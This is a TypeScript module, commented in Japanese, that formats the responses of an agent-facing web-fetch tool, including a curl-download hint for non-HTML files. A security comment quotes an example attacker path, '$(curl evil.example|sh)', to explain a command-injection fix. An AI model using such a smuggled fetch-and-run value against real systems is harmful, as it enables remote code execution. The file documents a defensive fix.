/**
 * formatting.ts — 応答フォーマット。各ツール応答の文字列整形のみを担当。I/O・cache参照を持たない純関数群。
 */
import type { CacheEntry } from "./cache.js";
import type { ImageBlock, ResolvedPage, ResolvedScreenshot, TextBlock } from "./core.js";
import type { SectionDiff } from "./diff.js";
import type { ExtractionMethod } from "./extract/markdown.js";
import type { OutlineResult } from "./extract/outline.js";
import { buildHandoffPreview } from "./extract/preview.js";
import { resolveDefaultMaxBodyBytes } from "./fetcher/http.js";
import type { HandoffResult } from "./fetcher/index.js";
import type { LinksResult } from "./links.js";
import { paginateMarkdown, type PaginatedResult } from "./tokens.js";

function adapterLine(adapterName: string | null): string[] {
  return adapterName ? [`adapter: ${adapterName}`] : [];
}

/**
 * 抽出経路の注記。"readability"(既定の成功経路)/"adapter"(adapter:行と重複するため省略)/
 * "selector"(ユーザー指定なので自明)は表示せず、Phase 4の "geometry" と、
 * 品質が疑わしい "body-fallback" のみユーザーへ明示する(トークン節約)。
 */
function extractionMethodLine(method: ExtractionMethod): string[] {
  return method === "geometry" || method === "body-fallback" ? [`extraction: ${method}`] : [];
}

/** Phase 4: テンプレート学習で除去した定型ブロック数(0件なら表示しない。トークン節約)。 */
function templateRemovedLine(templateRemovedCount: number): string[] {
  return templateRemovedCount > 0 ? [`template_blocks_removed: ${templateRemovedCount}`] : [];
}

/** N6: 単一ブロックがmax_tokens予算を超過し、分割できずそのまま返した場合のみ明示する。 */
function budgetExceededLine(paginated: PaginatedResult): string[] {
  return paginated.exceededBudget ? [`budget_exceeded: true(単一ブロックがmax_tokensを超過しています)`] : [];
}

/** 機能C: 構造化データリンクのヒント(検出ゼロなら空文字=トークン増ゼロ)。 */
export function dataSourcesSection(hints: string[]): string {
  return hints.length > 0 ? `\n\ndata_sources:\n${hints.join("\n")}` : "";
}

export function formatMarkdownResponse(
  page: ResolvedPage,
  paginated: PaginatedResult,
  sectionId: string | null,
  templateRemovedCount: number,
  breadcrumb: string | null = null,
): string {
  const header = [
    `title: ${page.title ?? "(なし)"}`,
    `url: ${page.finalUrl}`,
    `mode_used: markdown`,
    ...(sectionId ? [`section: ${sectionId}`] : []),
    // leaf節を単独取得したとき、この節が属する上位見出しの連なりを補い文脈喪失を防ぐ。
    ...(breadcrumb ? [`section_path: ${breadcrumb}`] : []),
    `cache: ${page.cacheStatus}`,
    `tokens: ${paginated.tokens}`,
    `page: ${paginated.page} of ${paginated.totalPages}`,
    `fetch_tier: ${page.tier}`,
    `pruned_blocks: ${page.prunedBlockCount}`,
    ...adapterLine(page.adapterName),
    ...extractionMethodLine(page.extractionMethod),
    ...templateRemovedLine(templateRemovedCount),
    ...budgetExceededLine(paginated),
  ].join("\n");
  return `${header}\n\n${paginated.content}${dataSourcesSection(page.dataSourceHints)}`;
}

/** §3-3 差分応答: 本文ハッシュ一致(約10トークンの短文応答)。 */
export function formatUnchangedResponse(page: ResolvedPage): string {
  return [`url: ${page.finalUrl}`, `mode_used: markdown`, `cache: unchanged`].join("\n");
}

function formatSectionDiffBlock(diff: SectionDiff): string {
  const label = diff.type === "added" ? "追加" : diff.type === "removed" ? "削除" : "変更";
  if (diff.type === "removed") {
    return `${"#".repeat(diff.level)} ${diff.heading} [${label}]`;
  }
  const lines = diff.content.split("\n");
  if (lines.length > 0 && /^#{1,6}\s/.test(lines[0] ?? "")) {
    lines[0] = `${lines[0]} [${label}]`;
    return lines.join("\n");
  }
  return `${"#".repeat(diff.level)} ${diff.heading} [${label}]\n\n${diff.content}`;
}

/** §3-3 差分応答: 変更・追加・削除された節のみ返却。 */
export function formatDiffResponse(page: ResolvedPage, sections: SectionDiff[], templateRemovedCount: number): string {
  const counts = { added: 0, changed: 0, removed: 0 };
  for (const section of sections) counts[section.type]++;

  const header = [
    `title: ${page.title ?? "(なし)"}`,
    `url: ${page.finalUrl}`,
    `mode_used: markdown`,
    `cache: diff`,
    `changed_sections: ${sections.length}(追加${counts.added}/変更${counts.changed}/削除${counts.removed})`,
    `fetch_tier: ${page.tier}`,
    ...adapterLine(page.adapterName),
    ...extractionMethodLine(page.extractionMethod),
    ...templateRemovedLine(templateRemovedCount),
  ].join("\n");

  return `${header}\n\n${sections.map(formatSectionDiffBlock).join("\n\n")}${dataSourcesSection(page.dataSourceHints)}`;
}

export function formatOutlineResponse(page: ResolvedPage, outline: OutlineResult, templateRemovedCount: number): string {
  const header = [
    `title: ${page.title ?? "(なし)"}`,
    `url: ${page.finalUrl}`,
    `mode_used: outline`,
    `cache: ${page.cacheStatus}`,
    `total_tokens: ${outline.totalTokens}`,
    `fetch_tier: ${page.tier}`,
    ...adapterLine(page.adapterName),
    ...extractionMethodLine(page.extractionMethod),
    ...templateRemovedLine(templateRemovedCount),
  ].join("\n");

  const body =
    outline.sections
      .map((section) => `${"  ".repeat(section.level - 1)}- [${section.id}] ${"#".repeat(section.level)} ${section.heading} — ${section.excerpt} (~${section.tokens} tok)`)
      .join("\n") || "(見出しが見つかりませんでした。mode: markdown で全文を取得してください)";

  return `${header}\n\n${body}`;
}

export function buildScreenshotContent(
  page: { title: string | null },
  screenshot: ResolvedScreenshot,
  reason: string | null,
): Array<TextBlock | ImageBlock> {
  const header = [
    `title: ${page.title ?? "(なし)"}`,
    `url: ${screenshot.finalUrl}`,
    `mode_used: screenshot`,
    `cache: ${screenshot.cacheStatus}`,
    `reason: ${reason ?? "明示的にscreenshotが指定されました"}`,
    `tiles: ${screenshot.tiles.length}`,
    `page_size: ${screenshot.pageWidth}x${screenshot.pageHeight}`,
    `fetch_tier: browser`,
    // N7: MAX_TILES切り捨てが発生した場合のみ明示する(トークン節約)
    ...(screenshot.truncated ? [`truncated: true(MAX_TILES枚を超えるため切り捨てました)`] : []),
  ].join("\n");

  return [
    { type: "text", text: header },
    ...screenshot.tiles.map((tile) => ({ type: "image" as const, data: tile.data.toString("base64"), mimeType: "image/png" })),
  ];
}

export function formatLinksResponse(url: string, result: LinksResult): string {
  const header = [`url: ${url}`, `source: ${result.source}`, `count: ${result.links.length}${result.truncated ? " (truncated)" : ""}`].join("\n");
  const body = result.links.map((link) => (link.title ? `- ${link.title} — ${link.url}` : `- ${link.url}`)).join("\n");
  // レビュー指摘対応: 0件のとき、フィルタで全部落ちたのか(preFilterCount>0)、
  // sitemap/RSS/ページ自体が空だったのか(preFilterCount===0)をエージェントが判別できるようにする。
  // filter未指定時はpreFilterCount===links.lengthのためこの分岐には入らない。
  const empty =
    result.preFilterCount > 0
      ? `(リンクが見つかりませんでした。フィルタ前 ${result.preFilterCount} 件。filterに一致しませんでした)`
      : "(リンクが見つかりませんでした)";
  return `${header}\n\n${body || empty}`;
}

// ---- 機能B: 非HTMLコンテンツのハンドオフ応答 ----

/**
 * URLのパス末尾からファイル名を推測する(curl -o のデフォルト値用)。取れなければ"download"。
 *
 * セキュリティ修正(CWE-78): WHATWG URLパーサは `'` `;` `|` `$` `` ` `` 等のパス中の文字を
 * パーセントエンコードしないため、攻撃者が細工したURL(例: `/$(curl evil.example|sh).csv`)経由で
 * このファイル名がそのままシェルコマンド文字列(hint行)に混入し、コマンドインジェクションが
 * 成立しうる。curlに渡す提案コマンドの一部として安全に提示できるよう、英数字・`.`・`-`・`_`
 * 以外は全て `_` に置換する。
 */
export function guessFilename(url: string): string {
  const rawBase = (() => {
    try {
      const pathname = new URL(url).pathname;
      return pathname.split("/").filter((segment) => segment.length > 0).pop() ?? "";
    } catch {
      return "";
    }
  })();
  const sanitized = rawBase.replace(/[^A-Za-z0-9._-]/g, "_");
  return sanitized.length > 0 ? sanitized : "download";
}

/**
 * シェルの単一引用符コンテキストへ値を安全に埋め込む(CWE-78対策)。
 * 単一引用符内では `'` 以外は解釈されないため、`'` のみ「引用符を閉じ、
 * エスケープ済み`'`を1つ挿入し、再び引用符を開く」(`'\''`)という定石で表現する。
 */
export function shellQuoteSingle(value: string): string {
  return `'${value.replace(/'/g, `'\\''`)}'`;
}

/**
 * 機能B: HTML/PDF以外のコンテンツタイプを「行き止まり」のエラーではなく、
 * メタデータ+プレビュー+curl誘導の正常応答として整形する。
 * ファイル全体がAMENBO_MAX_BODY_BYTESを超える場合(Content-Length既知時)は
 * プレビュー自体を省略し、メタデータ+誘導のみを返す。
 */
export function formatHandoffResponse(handoff: HandoffResult, maxTokens: number): string {
  const filename = guessFilename(handoff.finalUrl);
  const sizeKnown = handoff.declaredSize !== null;
  const sizeLabel = sizeKnown ? `${handoff.declaredSize}` : `${handoff.bytes.length}(取得分。Content-Lengthヘッダ無し)`;
  const oversized = sizeKnown && (handoff.declaredSize as number) > resolveDefaultMaxBodyBytes();

  const header = [
    `content_type: ${handoff.contentType ?? "(不明)"}`,
    `size: ${sizeLabel}`,
    `url: ${handoff.finalUrl}`,
    `mode_used: handoff`,
  ].join("\n");

  const preview = oversized ? null : buildHandoffPreview(handoff.bytes, handoff.contentType, maxTokens, handoff.truncated);
  const previewBlock = preview ? `\n\n${preview.body}${preview.note ? `\n\n(${preview.note})` : ""}` : "";

  const hint = `\n\nhint: このファイルはamenboの本文抽出対象外です。全体の取得は curl -L -o ${filename} ${shellQuoteSingle(handoff.finalUrl)} を推奨します`;

  return `${header}${previewBlock}${hint}`;
}

// ---- PDF対応(URL判定で独立経路。mode/selector/section等は適用しない) ----

export function formatPdfTextResponse(title: string | null, finalUrl: string, cacheStatus: "fresh" | "miss", pdfPageCount: number, paginated: PaginatedResult): string {
  const header = [
    `title: ${title ?? "(なし)"}`,
    `url: ${finalUrl}`,
    `mode_used: markdown`,
    `cache: ${cacheStatus}`,
    `tokens: ${paginated.tokens}`,
    `page: ${paginated.page} of ${paginated.totalPages}`,
    `fetch_tier: pdf`,
    `pdf_pages: ${pdfPageCount}`,
    ...budgetExceededLine(paginated),
  ].join("\n");
  return `${header}\n\n${paginated.content}`;
}

/** キャッシュ済みPDFエントリからテキスト応答を組み立てる(fresh応答/304再検証後の応答で共用)。 */
export function formatPdfResponseFromCache(url: string, cached: CacheEntry, maxTokens: number, page: number): string {
  const paginated = paginateMarkdown(cached.markdown, maxTokens, page);
  const title = (cached.metadata.title as string | null) ?? null;
  const finalUrl = (cached.metadata.finalUrl as string | undefined) ?? url;
  const pdfPageCount = Number(cached.metadata.pdfPageCount ?? 0);
  return formatPdfTextResponse(title, finalUrl, "fresh", pdfPageCount, paginated);
}
